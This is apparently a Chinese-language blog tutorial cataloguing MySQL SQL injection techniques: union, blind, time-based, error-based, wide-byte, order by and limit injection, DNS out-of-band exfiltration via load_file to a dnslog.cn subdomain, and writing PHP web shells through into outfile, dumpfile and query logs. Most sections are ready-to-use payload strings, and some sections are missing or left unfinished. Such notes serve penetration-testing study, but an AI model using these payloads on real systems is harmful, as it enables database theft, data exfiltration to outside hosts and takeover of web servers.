1、sql注入分类

常见分类为：联合注入、盲注、延时注入、报错注入、宽字节注入、堆叠注入，带外注入、二次注入等。

当然也可以把它分为有回显和无回显。有回显常使用联合注入、报错注入等，无回显的常使用盲注、延时注入及带外。

除此之外还有一些特殊的注入，如insert注入、update注入、limit注入、order by注入、搜索型注入等.......

Mysql还能用来提权，这属于后渗透知识了。(其实是我太菜不会)

Sql注入的核心在于你能猜到后台sql语句是如何编写。

2、联合查询注入

2.1、基础知识

Information_schema数据库：该数据库是MySQL内置数据库，里面能查到数据库内的所有数据库、表、字段等信息。
information_schema.schemata:利用这个表可以获取所有数据库名
Information_schema.tables：利用这个表获取数据库内所有表名
Information_schema.columns:利用这个表可以获取数据库内所有表的字段名
Order by：根据指定的列对结果集进行排序，在注入时用于确认列数
Union：用于合并执行两个或多个 SELECT 语句。只能使用在select语句中，且查询数据的列数一致,不能在order by后使用。
Group_concat():拼接函数，如返回多行用’,’分割。Group_concat(str1,str2,str3)str1为必须参数，其他两个为可选参数。如：select group_concat(‘123’,’cx’);输出123xc
Limit 0,1或 limit 1 offset 0：限定返回数据行数，第一个参数表示从第几行开始(下标从0开始)，第二个参数表示取几行

2.2、Mysql注释

注释 #、--空格(--+)，注释后面的内容不会执行
单行注释 /**/，*号内的内容不会执行
内敛注释/*!50726select*/，’!’后的50726表示mysql版本5.7.26，如果当前数据库版本大于或等于5.7.26版本就执行注释内的语句

3、盲注

盲注就是存在注入点但无回显，只能通过服务器返回内容或状态判断是否存在注入。如输入内容正确返回正常，错误返回异常。

如提问mysql服务器，它只能说正确和错误，这时可以问“当前数据库的长度是否为4、数据库的第一个字符是否为’a’”，mysql服务器说正确或错误。

3.1、函数

Length()：计算查询数据的长度
Substr()、substring()、mid()：截取字符串，使用substr((表达式),1,1)注意这里下标从1开始，其他两个函数的使用与substr()一致
Ascii()、ord()：字符转数字，返回查询字符对应的sacii码，’a’的ascii码为97
Right()：从右往左取查询数据的N位，使用rigth((表达式),2(取两位))，搭配ascii()和ord()实现精准获取。如select ord(right((select database()),2));
left()：从左往右取查询数据的N位，使用left((表达式),1(取1位))。实现精准获取使用revers()与ascii()或ord()搭配，select ord(reverse(left((select database()),1)));
regexp、rlike ：判断字符是否在匹配的正则表达式(大小写不敏感)从左往右一起匹配，使用binary (表达式) regexp '^abc'
concat()、group_concat()、CONCAT_WS(),字符拼接函数
replace()字符替换(绕过限制使用)如：select replace('/var/www/html/1.jpg','jpg','php')

5、报错注入

5.1、报错注入分类与原理

BIGINT登数据类型溢出
xpath语法错误
concat+rand()+gruop_by()导致主键重复
空间数据类型函数错误

5.2、函数

Updatexml()：使用and (updatexml(1,concat(0x7e,(表达式),0x7e),1)),版本>=5.1.5
Extractvalue()：使用 and (extractvalue(1,concat(0x7e,(表达式),0x7e))) 版本>=5.1.5
Count(*)与floor()：也叫做sql双查询。有时能为盲注”逆天改命”，使用 and (select 1 from (select count(*),concat((表达式),0x7e,floor(rand(0)*4))x from information_schema.tables group by x)a);

以下几个版本限制我使用不了，在这提一下

Exp()：官方文档说>=5.5.5版本可以，但我使用5.7.26不行，但是看网上的博客可以，除了可以进行报错注入，在特定环境下可以用来进行盲注。该函数报错的阈值为709使用。1、报错：select exp(~(select * from(表达式)x));2、盲注，构造0，1即可，如select exp((1=(表达式)*999);、if((表达式),exp(999),0)
Cot()：cot(表达式)表达式为真不报错，为假报错，也可以反过来
Pow()：pow(参数1，99999)只需构造参数1的值大于等于1，大于1报错。可以这样写pow(1+(1=(表达式)),11111)
GemetryCollection()、multipoint()、polygon()、multipolygon()、linestring()、multilinestring()这几个都是mysql中的空间数据类型（存储）的函数。

字段名：select * from aaa where id=1 and (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='aaa' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);
数据：select * from aaa where id=1 and (select 1 from(select count(*),concat((select id from aaa limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);

5.3.4、Exp()、cot()、pow()

#exp()函数溢出报错，阈值709，exp(709+(表达式))

select * from aaa where id=1 and exp((length(database())=4)+709);

#cot()函数，cot()内为1正常，为0报错，使用与exp()一致

select * from aaa where id=1 and cot(1-(length(database())=4));

#pow()函数，使用pow(1+(表达式),99999)，当表达式为真报错

select * from aaa where id=1 and pow(1+(length(database())=5),99999);

6、宽字节注入

宽字节注入是由于网站使用的编码于数据库使用的编码不一致导致。后台语句过滤了输入的’单引号为\，这时使用%df’转到后台后%df会与\进行编码组成一个字，这时’就逃逸出来了。

Payload=%df’ and (updatexml(1,concat(0x7e,(select database()),0x7e),1))--+

然后可以进行报错注入了，需要注意的是指定表名的时候还需要用到’单引号，这时可以进行十六进制编码，还有两种绕过下面讲bypass时会提到。十六进制可以直接在mysql下进行select hex(‘需要编码的字符’)；

除了报错还能盲注、延时注入。

7、order by注入

7.1.1、正则盲注

使用regexp与报错函数exp(),cot(),pow()及字符0x00

select * from aaa order by (select 1 regexp if((表达式),1,exp(999))) asc;

接下来在表达式里面构造就好了

7.1.2、Updatexml()与extractvalue()

接着套娃就行了

select * from aaa order by updatexml(1,concat(0x7e,(表达式),0x7e),1) asc;
select * from aaa order by extractvalue(1,concat(0x7e,(表达式),0x7e)) asc;

7.1.3、延时注入

这里的sleep()时间并非3秒，看下图，返回三行执行三次sleep()

select * from aaa order by if((1=1),sleep(3),1) asc;

8、limit注入

只能在mysql5.0.0~5.6.6版本中使用

假设后台语句，注入点在1：select * from aaa where id>0 order by id asc limit 0,1;

Order by语句后不能使用union，limit后面可以加两个参数procedure、into。Into可以使用导出函数进行写shell。Procedure可以使用报错注入或时间盲注。

8.1、报错注入

select * from aaa where id>0 order by id asc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x7e,(表达式))),1);

8.2、延时注入

我利用不成功，不懂为啥，下面是网上的payload

SELECT id FROM aaa WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);

直接构造表达式就好了

11、mysql带外注入与文件读取

进行盲注和延时注入时是不是很麻烦，那么如何更加快速的进行数据获取呢？带外注入能帮到你。

11.1、前提条件

只能在windows系统下使用，linux不支持，主要因为unc这玩意

mysql<5.5.53默认开启 如果secure_file_priv的值为C:\,就只能读c盘

11.2、带外注入使用

‘////’四个斜杠的原因是系统会吃掉两个

使用hex()包裹的原因是进行dns查询时如果携带了特殊符号会无法查询

Dnslog.cn是一个免费的dns接收平台，但是目前大多数防护设备会将这些地址内容自身规则库内，如burp的、土司的、还有ceye.io

‘/a.txt’资源必须填写

and load_file(concat('////',hex(表达式),'.xxx.dnslog.cn/a.txt'));

12、mysql写shell

12.1、前提条件

知道网站绝对路径，并且能访问到。
网站的目录可写
secure_file_priv为空，或为网站路径所在盘
当前数据库用户角色具备写入权限
GPC关闭//未对闭合用的引号转
写入路径下不能出现与将要写入的文件名一样

12.2、函数

Outfile()与Dumpfile()为mysql数据库导出函数。Outfile()可导出多行，dumpfile()只能导出一行但可以加上linit。

写shell可以使用union查询写shell、补充说明写shell与导出数据写shell

12.3、union查询写shell

union select '<?php phpinfo();?>' into outfile ‘C:\\\\phpstudy\\www\\a.php’;
union select 1,'<?php phpinfo();?>' into dumpfile 'D:\\\\phpstudy\\www\\dumpfile.php';

12.4、补充说明写shell

在导出数据时支持补充说明

Fields terminated by ',' 字段以,分割
Optionally enclosed by ',' 字段值以’包裹
lines terminated by ',' 设置每⾏数据结尾的字符为换行符
还可以fields terminated by '|' enclosed by '"'，字段以|分隔并用"括起来

使用：

select * from aaa where id=1 into outfile 'D:\\\\phpstudy\\www\\b.php' lines terminated by '<?php phpinfo();?>';

12.5、导出写shell

怎么把shell插进去，得看大家的发挥，本地存在的数据有shell。导出写shell似乎只能在堆叠注入中使用或后台中。

使用：

Select * from qwe into outfile ‘D:\\\\phpstudy\\www\\shell.php’;

12.6、日志写shell

Mysql有5种日志，其中只有查询日志和慢查询日志可以写shell。但是查询日志开启的话会产生大量日志信息，会影响解析。所以日志写shell一般在慢查询日志中操作。

日志写shell规避了secure_file_priv的限制。

查询一句话：select ‘<?php phpinfo();?>’;
最后关闭查询日志：set golbal general_log=off;
